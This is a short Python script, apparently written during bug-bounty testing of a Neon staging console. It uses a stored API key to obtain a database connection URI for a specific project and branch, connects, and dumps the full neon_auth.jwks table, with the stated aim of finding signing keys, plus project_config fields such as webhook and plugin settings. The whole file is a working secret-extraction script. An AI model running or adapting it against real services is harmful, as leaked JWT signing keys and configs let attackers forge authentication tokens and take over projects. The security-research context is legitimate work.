# -*- coding: utf-8 -*-
"""dump neon_auth.jwks + full project_config row - look for signing keys"""
import json, ssl, time, http.client

ctx = ssl.create_default_context()
import psycopg
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
             "?database_name=neondb&role_name=neondb_owner"
             "&branch_id=br-wandering-field-w2ob6mpn",
             headers={"X-Bug-Bounty": "xxbo",
                      "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
r = conn.getresponse()
uri = json.loads(r.read().decode())["uri"]
conn.close()
p = urlsplit(uri)
q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
with psycopg.connect(uri2, connect_timeout=15) as dbc:
    dbc.autocommit = True
    with dbc.cursor() as cur:
        cur.execute("SELECT column_name, data_type FROM information_schema.columns "
                    "WHERE table_schema='neon_auth' AND table_name='jwks'")
        print("jwks cols:", cur.fetchall())
        cur.execute("SELECT * FROM neon_auth.jwks")
        rows = cur.fetchall()
        cols = [d[0] for d in cur.description]
        print("jwks rows: %d" % len(rows))
        for row in rows:
            for c, v in zip(cols, row):
                s = str(v)
                print("  %-12s = %s" % (c, s[:300]))
        cur.execute("SELECT column_name FROM information_schema.columns "
                    "WHERE table_schema='neon_auth' AND table_name='project_config'")
        print("project_config cols:", [r[0] for r in cur.fetchall()])
        cur.execute("SELECT name, endpoint_id, trusted_origins, plugin_configs, webhook_config "
                    "FROM neon_auth.project_config")
        for row in cur.fetchall():
            for c, v in zip(("name", "endpoint_id", "trusted_origins", "plugin_configs", "webhook_config"), row):
                print("  %-16s = %s" % (c, str(v)[:600]))
